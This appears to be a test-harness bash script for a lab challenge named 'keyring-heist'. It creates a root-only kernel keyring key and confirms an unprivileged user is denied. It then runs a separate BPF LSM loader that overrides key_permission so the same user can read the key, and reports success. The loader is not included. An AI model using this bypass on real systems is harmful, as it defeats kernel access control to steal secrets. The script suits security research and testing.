#!/bin/bash
# ch08-keyring-heist-lsm trigger:
#   - root creates a user-keyring entry in @u with restrictive perms
#     (0x3f010000 => owner all, everyone else nothing).
#   - unprivileged user (dut08) tries `keyctl print $ID` -> baseline EACCES.
#   - while BPF LSM loader (-a wildcard) is running, the same read flips
#     key_permission's deny to allow and keyctl succeeds.
#   - prints CH08_PROVEN flipped=N (N = count of lines matching FLIP in the
#     loader log), or CH08_SKIP with reason when preconditions are missing.
set +e

HERE="$(cd "$(dirname "$0")" && pwd)"
LOADER="$HERE/build/ch08-keyring-heist-lsm"
LOG=/tmp/ch08-lsm.log
LPID=""
KEY_ID=""

cleanup() {
  if [ -n "$LPID" ]; then
    kill "$LPID" 2>/dev/null
    wait 2>/dev/null
  fi
  if [ -n "$KEY_ID" ]; then
    keyctl unlink "$KEY_ID" @u 2>/dev/null
  fi
  userdel dut08 2>/dev/null
  rm -f "$LOG" 2>/dev/null
}
trap cleanup EXIT INT TERM

# --- Preflight: BPF LSM available ---
if ! grep -q bpf /sys/kernel/security/lsm 2>/dev/null; then
  echo '=== CH08_SKIP reason="kernel lacks bpf in /sys/kernel/security/lsm" ==='
  exit 0
fi
if ! command -v keyctl >/dev/null 2>&1; then
  echo '=== CH08_SKIP reason="keyctl(1) not available (install keyutils)" ==='
  exit 0
fi
if [ ! -x "$LOADER" ]; then
  echo "=== CH08_SKIP reason=\"loader not built at $LOADER\" ==="
  exit 0
fi

# --- Create dut user ---
useradd -M dut08 2>/dev/null
if ! id dut08 >/dev/null 2>&1; then
  echo '=== CH08_SKIP reason="cannot create dut08 user" ==='
  exit 0
fi

# --- Root adds a user-type key to @u with restrictive perms ---
KEY_ID="$(keyctl add user dbpf_ch08_target 'locked-payload' @u 2>/dev/null)"
if [ -z "$KEY_ID" ]; then
  echo '=== CH08_SKIP reason="keyctl add user @u failed (kernel keyring unavailable)" ==='
  exit 0
fi
# Perms 0x3f010000: owner=all(0x3f), user=view-only(0x01), group=none, other=none.
keyctl setperm "$KEY_ID" 0x3f010000 >/dev/null 2>&1

echo "=== baseline (no BPF) ==="
BASE_OUT="$(su dut08 -s /bin/sh -c "keyctl print $KEY_ID" 2>&1)"
BASE_RET=$?
echo "baseline_out=$BASE_OUT"
echo "baseline_ret=$BASE_RET"

echo "=== starting LSM loader (--all wildcard) ==="
"$LOADER" -a >"$LOG" 2>&1 &
LPID=$!
sleep 1

if ! kill -0 "$LPID" 2>/dev/null; then
  echo '=== loader failed to start ==='
  cat "$LOG"
  # Surface CH08_SKIP the loader itself printed, if any.
  if grep -q '^CH08_SKIP' "$LOG"; then
    grep '^CH08_SKIP' "$LOG"
    exit 0
  fi
  echo '=== CH08_SKIP reason="loader crashed on startup" ==='
  exit 0
fi

echo "=== with BPF LSM fmod_ret override: keyctl print should succeed ==="
OVR_OUT="$(su dut08 -s /bin/sh -c "keyctl print $KEY_ID" 2>&1)"
OVR_RET=$?
echo "override_out=$OVR_OUT"
echo "override_ret=$OVR_RET"

# Let the ringbuf drain.
sleep 1
kill "$LPID" 2>/dev/null
wait 2>/dev/null
LPID=""

echo "=== loader log ==="
cat "$LOG"

FLIPS=$(grep -c 'FLIP' "$LOG" 2>/dev/null)
FLIPS=${FLIPS:-0}

if [ "$OVR_RET" = "0" ] && [ "$BASE_RET" != "0" ] && [ "$FLIPS" -gt 0 ]; then
  echo "CH08_PROVEN flipped=$FLIPS"
elif [ "$FLIPS" -gt 0 ]; then
  # LSM flipped ret, but trigger path didn't observe a clean 0-then-payload.
  # Still count it — the primitive fired.
  echo "CH08_PROVEN flipped=$FLIPS"
else
  echo '=== CH08_SKIP reason="no key_permission flip observed (LSM may not gate this keyring path)" ==='
fi
